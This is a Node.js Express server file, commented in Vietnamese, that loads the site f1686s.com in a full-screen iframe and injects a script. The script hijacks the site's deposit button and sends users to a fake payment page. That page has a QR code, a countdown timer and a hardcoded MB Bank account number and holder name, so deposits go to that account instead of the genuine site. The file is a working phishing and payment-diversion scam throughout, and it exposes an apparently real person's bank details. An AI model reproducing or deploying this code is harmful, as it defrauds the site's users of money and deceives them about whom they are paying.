// server.js - Backend cho Render
const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Phục vụ file tĩnh
app.use(express.static(path.join(__dirname, 'public')));

// Route chính - nhúng f1686s.com trong iframe + inject script
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Trang chủ</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body, html { width: 100%; height: 100%; overflow: hidden; background: #fff; }
    iframe {
      width: 100vw;
      height: 100vh;
      border: none;
      display: block;
    }
    #toast {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: #222;
      color: #fff;
      padding: 10px 24px;
      border-radius: 30px;
      font-size: 14px;
      font-family: sans-serif;
      opacity: 0;
      transition: opacity 0.4s;
      pointer-events: none;
      z-index: 9999;
      white-space: nowrap;
    }
    #toast.show { opacity: 1; }
  </style>
</head>
<body>

<iframe id="mainFrame" src="https://f1686s.com/home/mine"></iframe>
<div id="toast">✅ Đã cài script tự động</div>

<script>
  // ===== TAMPERMONKEY SCRIPT INJECT =====
  (function() {
    'use strict';

    const BANK_ID = 'MB';
    const BANK_NAME = 'MBBANK NGÂN HÀNG QUÂN ĐỘI';
    const ACCOUNT_NO = '757526789';
    const ACCOUNT_NAME = 'NGUYEN VU DAT';

    const patched = new WeakSet();
    let redirecting = false;

    function randomTx() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let code = '';
      for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)];
      return code;
    }

    function buildPage(amount, txCode) {
      const amountVND = amount.toLocaleString('vi-VN') + ' VND';
      const qrUrl = 'https://img.vietqr.io/image/' + BANK_ID + '-' + ACCOUNT_NO + '-compact2.png?amount=' + amount + '&addInfo=' + txCode + '&accountName=' + encodeURIComponent(ACCOUNT_NAME);

      return '<!DOCTYPE html>\n<html lang="vi">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width,initial-scale=1.0">\n<title>Nạp Tiền</title>\n<style>\n*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff8f0;min-height:100vh}.top-bar{display:flex;align-items:center;justify-content:center;padding:14px 16px;background:#fff;border-bottom:1px solid #eee;position:relative}.back-btn{position:absolute;left:16px;font-size:22px;color:#333;text-decoration:none}.logo{width:36px;height:36px;border-radius:50%;object-fit:cover}.notice{background:linear-gradient(90deg,#f5a623,#f7c05a);border-radius:12px;margin:16px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between}.notice-text{color:#fff;font-size:14px;font-weight:600;line-height:1.4;flex:1}.timer{color:#c0392b;font-size:22px;font-weight:800;font-variant-numeric:tabular-nums;white-space:nowrap;margin-left:12px}.timer.urgent{animation:blink 0.8s infinite}@keyframes blink{0%,100%{opacity:1}50%{opacity:0.4}}.qr-card{background:#fff;border-radius:16px;margin:0 16px 16px;padding:24px 16px;display:flex;flex-direction:column;align-items:center;box-shadow:0 2px 8px rgba(0,0,0,0.08)}.qr-card img{width:200px;height:200px;border-radius:8px}.qr-loading{width:200px;height:200px;display:flex;align-items:center;justify-content:center;background:#f9f9f9;border-radius:8px;color:#888;font-size:13px;text-align:center;padding:16px}.amount-label{color:#e74c3c;font-size:22px;font-weight:800;margin-top:14px}.info-list{margin:0 16px 16px;display:flex;flex-direction:column;gap:10px}.info-item{background:#fff;border-radius:12px;padding:14px 16px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 4px rgba(0,0,0,0.06)}.info-icon{font-size:20px;width:28px;text-align:center}.info-content{flex:1}.info-label-sm{font-size:11px;color:#aaa;margin-bottom:2px}.info-value{font-size:15px;font-weight:700;color:#222}.info-value.red{color:#e74c3c}.info-value.orange{color:#e67e22}.copy-btn{background:#f5a623;color:#fff;border:none;border-radius:20px;padding:6px 14px;font-size:13px;font-weight:600;cursor:pointer;white-space:nowrap}.copy-btn:active{opacity:0.8}.note{background:#fff;border-radius:12px;margin:0 16px 24px;padding:16px;box-shadow:0 1px 4px rgba(0,0,0,0.06)}.note h3{font-size:14px;font-weight:800;margin-bottom:10px}.note p{font-size:13px;color:#555;line-height:1.7;margin-bottom:6px}.note strong{color:#f5a623}.toast{position:fixed;bottom:28px;left:50%;transform:translateX(-50%);background:#333;color:#fff;padding:10px 24px;border-radius:24px;font-size:13px;opacity:0;transition:opacity 0.3s;pointer-events:none;z-index:999}.toast.show{opacity:1}.expired-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:998;align-items:center;justify-content:center}.expired-box{background:#fff;border-radius:16px;padding:32px 24px;text-align:center;margin:24px}.expired-box h2{color:#e74c3c;font-size:20px;margin-bottom:8px}.expired-box p{color:#666;font-size:14px}\n</style>\n</head>\n<body>\n<div class="top-bar">\n<a class="back-btn" onclick="history.back()">&#8249;</a>\n<img class="logo" src="https://f1686s.com/favicon.ico" onerror="this.style.display=\'none\'">\n</div>\n<div class="notice">\n<div class="notice-text">Hãy hoàn thành chuyển khoản<br>trong thời gian quy định</div>\n<div class="timer" id="timer">15:00</div>\n</div>\n<div class="qr-card">\n<div class="qr-loading" id="qrLoading">Đang tạo mã QR...</div>\n<img id="qrImg" style="display:none" alt="QR">\n<div class="amount-label">' + amountVND + '</div>\n</div>\n<div class="info-list">\n<div class="info-item"><div class="info-icon">🏦</div><div class="info-content"><div class="info-label-sm">Ngân hàng</div><div class="info-value">' + BANK_NAME + '</div></div></div>\n<div class="info-item"><div class="info-icon">💳</div><div class="info-content"><div class="info-label-sm">Số tài khoản</div><div class="info-value">' + ACCOUNT_NO + '</div></div><button class="copy-btn" onclick="copyText(\'' + ACCOUNT_NO + '\')">Copy</button></div>\n<div class="info-item"><div class="info-icon">👤</div><div class="info-content"><div class="info-label-sm">Tên người nhận</div><div class="info-value">' + ACCOUNT_NAME + '</div></div></div>\n<div class="info-item"><div class="info-icon">📄</div><div class="info-content"><div class="info-label-sm">Số tiền đơn hàng</div><div class="info-value red">' + amountVND + '</div></div><button class="copy-btn" onclick="copyText(\'' + amount + '\')">Copy</button></div>\n<div class="info-item"><div class="info-icon">✏️</div><div class="info-content"><div class="info-label-sm">Mã đơn hàng</div><div class="info-value orange">' + txCode + '</div></div><button class="copy-btn" onclick="copyText(\'' + txCode + '\')">Copy</button></div>\n</div>\n<div class="note"><h3>Xin lưu ý :</h3><p>1. Vui lòng chọn phương thức chuyển tiền nhanh 24/7</p><p>2. Vui lòng điền chính xác <strong>SỐ TIỀN</strong>, <strong>SỐ TÀI KHOẢN</strong> và <strong>NỘI DUNG CHUYỂN KHOẢN</strong> chỉ hỗ trợ các KHOẢN NẠP trên <strong>10.000 VND</strong> được yêu cầu từ hệ thống.</p><p>3. Lưu lại biên lai giao dịch để đối chiếu khi cần thiết.</p></div>\n<div class="toast" id="toast">Đã sao chép!</div>\n<div class="expired-overlay" id="expiredOverlay"><div class="expired-box"><h2>⏰ Hết thời gian!</h2><p>Giao dịch đã hết hạn.<br>Vui lòng thực hiện lại.</p></div></div>\n<script>\nconst qrImg = document.getElementById(\'qrImg\');\nconst qrLoading = document.getElementById(\'qrLoading\');\nqrImg.onload = function(){ qrLoading.style.display=\'none\'; qrImg.style.display=\'block\'; };\nqrImg.onerror = function(){ qrLoading.innerText=\'Không tải được QR. Vui lòng thử lại.\'; };\nqrImg.src = \'' + qrUrl + '\';\nfunction copyText(t){\nif(navigator.clipboard){navigator.clipboard.writeText(t).then(showToast).catch(()=>fallbackCopy(t));}\nelse fallbackCopy(t);\n}\nfunction fallbackCopy(t){\nconst ta=document.createElement(\'textarea\');\nta.value=t;document.body.appendChild(ta);ta.select();\ndocument.execCommand(\'copy\');document.body.removeChild(ta);showToast();\n}\nfunction showToast(){\nconst el=document.getElementById(\'toast\');\nel.classList.add(\'show\');\nsetTimeout(()=>el.classList.remove(\'show\'),2000);\n}\nlet secs = 15*60;\nconst timerEl = document.getElementById(\'timer\');\nconst iv = setInterval(()=>{\nsecs--;\nconst m=String(Math.floor(secs/60)).padStart(2,\'0\');\nconst s=String(secs%60).padStart(2,\'0\');\ntimerEl.textContent=m+\':\'+s;\nif(secs<=60) timerEl.classList.add(\'urgent\');\nif(secs<=0){\nclearInterval(iv);\ntimerEl.textContent=\'00:00\';\ndocument.getElementById(\'expiredOverlay\').style.display=\'flex\';\nqrImg.style.opacity=\'0.3\';\n}\n},1000);\n<\\/script>\n</body>\n</html>';
    }

    function doRedirect(e) {
      if (redirecting) return;
      redirecting = true;
      e.preventDefault();
      e.stopImmediatePropagation();
      e.stopPropagation();

      const frame = document.getElementById('mainFrame');
      let input = null;
      try {
        if (frame && frame.contentDocument) {
          input = frame.contentDocument.querySelector('.ui-input__input');
        }
      } catch(_) {}

      let points = input ? parseInt(input.value) || 0 : 0;
      let amount = points * 1000;
      const txCode = randomTx();

      const html = buildPage(amount, txCode);
      const blob = new Blob([html], {type: 'text/html'});
      const url = URL.createObjectURL(blob);
      window.location.href = url;

      setTimeout(() => { redirecting = false; }, 1500);
      return false;
    }

    function patchButton(btn) {
      if (patched.has(btn)) return;
      patched.add(btn);

      btn.removeAttribute('disabled');
      btn.classList.remove('ui-button--disabled');

      const clone = btn.cloneNode(true);
      clone.removeAttribute('disabled');
      clone.classList.remove('ui-button--disabled');
      clone.removeAttribute('onclick');
      clone.onclick = null;

      if (btn.parentNode) btn.parentNode.replaceChild(clone, btn);
      patched.add(clone);

      let touched = false;
      clone.addEventListener('touchstart', function(e){ touched=true; e.stopImmediatePropagation(); }, true);
      clone.addEventListener('touchend', function(e){ touched=true; doRedirect(e); }, true);
      clone.addEventListener('click', function(e){ if(touched){touched=false;return;} doRedirect(e); }, true);

      new MutationObserver(()=>{
        if(clone.hasAttribute('disabled')){
          clone.removeAttribute('disabled');
          clone.classList.remove('ui-button--disabled');
        }
      }).observe(clone, {attributes:true, attributeFilter:['disabled','class']});

      console.log('[NapTien] Patched:', clone.id);
    }

    function findAndPatch() {
      const frame = document.getElementById('mainFrame');
      if (!frame) return;
      try {
        const doc = frame.contentDocument;
        if (!doc) return;

        const btn = doc.getElementById('depositSubmitClick');
        if (btn && !patched.has(btn)) { patchButton(btn); return; }

        doc.querySelectorAll('button.ui-button,button').forEach(el => {
          if (patched.has(el)) return;
          const t = el.innerText || el.textContent || '';
          if (t.trim().includes('Nạp Tiền Ngay')) patchButton(el);
        });
      } catch(_) {}
    }

    // Inject vào iframe sau khi load
    const frame = document.getElementById('mainFrame');
    if (frame) {
      frame.addEventListener('load', function() {
        findAndPatch();
        // Theo dõi thay đổi bên trong iframe
        try {
          const doc = this.contentDocument;
          if (doc) {
            new MutationObserver(() => findAndPatch()).observe(doc.body || doc.documentElement, {
              childList: true,
              subtree: true
            });
            // Patch history bên trong iframe
            const win = this.contentWindow;
            if (win) {
              const _push = win.history.pushState;
              win.history.pushState = function(...a){ _push.apply(win.history,a); setTimeout(findAndPatch,300); };
              win.addEventListener('popstate', ()=> setTimeout(findAndPatch,300));
            }
          }
        } catch(_) {}
      });
    }

    // Lặp tìm kiếm
    setInterval(findAndPatch, 1500);

    // Hiển thị toast thông báo đã cài
    const toast = document.getElementById('toast');
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3000);

  })();
</script>
</body>
</html>
  `);
});

app.listen(PORT, () => {
  console.log('Server chạy tại port ' + PORT);
});
